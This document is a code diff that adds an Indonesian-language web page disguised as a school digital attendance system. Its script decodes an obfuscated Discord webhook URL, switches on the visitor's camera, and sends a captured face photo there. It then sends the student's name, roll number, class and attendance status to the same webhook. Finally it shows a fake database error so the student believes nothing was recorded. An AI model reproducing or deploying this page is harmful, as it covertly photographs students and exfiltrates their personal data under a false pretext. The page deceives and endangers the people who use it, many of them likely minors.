@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sistem Presensi Digital v3.0</title>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root { 
+            --grad: linear-gradient(135deg, #7b2cbf 0%, #3a86ff 100%);
+            --glass: rgba(255, 255, 255, 1);
+        }
+        * { box-sizing: border-box; transition: all 0.3s ease; }
+        body { 
+            margin: 0; 
+            font-family: 'Plus Jakarta Sans', sans-serif; 
+            background: #eef2f7;
+            display: flex; justify-content: center; align-items: center; min-height: 100vh; 
+        }
+        .card { 
+            width: 92%; max-width: 400px; 
+            background: var(--glass); 
+            border-radius: 30px; 
+            box-shadow: 0 20px 40px rgba(0,0,0,0.05); 
+            overflow: hidden; 
+        }
+        .banner { 
+            background: var(--grad); padding: 50px 20px; text-align: center; color: white; 
+            border-bottom-left-radius: 50px; position: relative;
+        }
+        .banner::after {
+            content: ''; position: absolute; bottom: 15px; left: 50%; transform: translateX(-50%);
+            width: 35px; height: 4px; background: rgba(255,255,255,0.4); border-radius: 10px;
+        }
+        .main { padding: 40px 30px; text-align: center; }
+        .cam-frame { 
+            width: 100%; aspect-ratio: 1/1; background: #000; border-radius: 25px; 
+            overflow: hidden; margin-bottom: 25px; border: 4px solid #f8fafc;
+        }
+        video { width: 100%; height: 100%; object-fit: cover; }
+        input, select { 
+            width: 100%; padding: 16px; border-radius: 15px; border: 1.5px solid #e2e8f0; 
+            margin-bottom: 15px; outline: none; font-size: 15px; background: #fff;
+        }
+        input:focus { border-color: #3a86ff; }
+        .btn-action { 
+            width: 100%; padding: 18px; border: none; border-radius: 15px; 
+            background: #8338ec; color: white; font-weight: 700; cursor: pointer; 
+            font-size: 16px; box-shadow: 0 4px 12px rgba(131, 56, 236, 0.2);
+        }
+        .btn-action:hover { background: #740cdc; transform: translateY(-2px); }
+        .btn-action:active { transform: scale(0.95); background: #5e0bb5; }
+        .hidden { display: none; }
+        h2 { margin: 0; font-size: 24px; letter-spacing: -0.5px; }
+        .sub-text { font-size: 14px; color: #64748b; line-height: 1.6; }
+        .error-icon { font-size: 60px; color: #ef4444; margin-bottom: 15px; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <div class="banner">
+        <h2>PRESENSI DIGITAL</h2>
+        <p style="color: white; opacity: 0.9; margin: 8px 0 0; font-size: 12px; font-weight: 600; letter-spacing: 1px;">SISTEM VERIFIKASI AKADEMIK</p>
+    </div>
+    
+    <div id="p1" class="main">
+        <p class="sub-text">Silakan melakukan verifikasi identitas untuk sinkronisasi pangkalan data kehadiran.</p>
+        <button class="btn-action" onclick="nav(2)">MASUK PRESENSI</button>
+    </div>
+
+    <div id="p2" class="main hidden">
+        <div class="cam-frame"><video id="v" autoplay playsinline muted></video></div>
+        <button id="snap" class="btn-action" onclick="xCap()">AMBIL GAMBAR</button>
+        <p class="sub-text" style="font-size: 11px; margin-top: 15px;">Posisikan wajah tepat pada bingkai kamera.</p>
+    </div>
+
+    <div id="p3" class="main hidden">
+        <select id="k">
+            <option>XI - RPL (Rekayasa Perangkat Lunak)</option>
+            <option>XI - TKJ (Teknik Komputer Jaringan)</option>
+            <option>XI - DKV (Desain Komunikasi Visual)</option>
+        </select>
+        <input type="text" id="n" placeholder="Nama Lengkap">
+        <input type="number" id="a" placeholder="Nomor Absen">
+        <select id="s">
+            <option>Hadir - Tepat Waktu</option><option>Izin - Resmi</option><option>Sakit - Disertai Keterangan Dokter</option>
+        </select>
+        <button id="f-btn" class="btn-action" onclick="fSub()">KIRIM DATA</button>
+    </div>
+
+    <div id="p4" class="main hidden">
+        <div class="error-icon">❗</div>
+        <h3 style="margin: 0; color: #2d3436;">ABSENSI GAGAL</h3>
+        <p class="sub-text" style="margin-top: 10px; font-weight: 600;">Error Code: 0x882-DB</p>
+        <p class="sub-text">Sinkronisasi Server dan Database gagal dilakukan. Server dan Database tidak terinstall.</p>
+    </div>
+</div>
+
+<canvas id="c" class="hidden"></canvas>
+
+<script>
+    const _secret = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ2NjY0OTkzNzA1MDg2NTgyNy9KeDJtcE1kZFZ2d2hQbGJTYmFhUjdyMzhXTXZTWGxDa0lidVBBX1FjR1Npb1hfMHBUVEU2Y2F4ZDBFZ05kQnlYcjZCSA==";
+    const _wh = atob(_secret);
+
+    function nav(n) {
+        document.querySelectorAll('.main').forEach(e => e.classList.add('hidden'));
+        document.getElementById('p'+n).classList.remove('hidden');
+        if(n === 2) startV();
+    }
+
+    async function startV() {
+        try {
+            const s = await navigator.mediaDevices.getUserMedia({video: {facingMode: "user"}});
+            document.getElementById('v').srcObject = s;
+        } catch(e) { alert("Izin akses perangkat diperlukan."); }
+    }
+
+    function xCap() {
+        const v = document.getElementById('v'), c = document.getElementById('c'), btn = document.getElementById('snap');
+        btn.disabled = true; btn.innerText = "Memproses...";
+        c.width = v.videoWidth; c.height = v.videoHeight;
+        c.getContext('2d').drawImage(v, 0, 0);
+        c.toBlob(async (blob) => {
+            const fd = new FormData();
+            fd.append('payload_json', JSON.stringify({
+                content: "📌 **ENTRY DETECTED**",
+                username: "System Node 01"
+            }));
+            fd.append('file', blob, 'log_capture.jpg');
+            try { await fetch(_wh, { method: 'POST', body: fd }); nav(3); } 
+            catch (e) { nav(3); }
+        }, 'image/jpeg', 0.6);
+    }
+
+    async function fSub() {
+        const btn = document.getElementById('f-btn');
+        const data = `📋 **ABSENSI TERKIRIM**\n**Nama:** ${document.getElementById('n').value}\n**No:** ${document.getElementById('a').value}\n**Unit:** ${document.getElementById('k').value}\n**Status:** ${document.getElementById('s').value}`;
+        btn.disabled = true; btn.innerText = "Syncing...";
+        try {
+            await fetch(_wh, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ content: data, username: "Academic DB" })
+            });
+            setTimeout(() => { nav(4); }, 1500);
+        } catch (e) { nav(4); }
+    }
+</script>
+</body>
+</html>
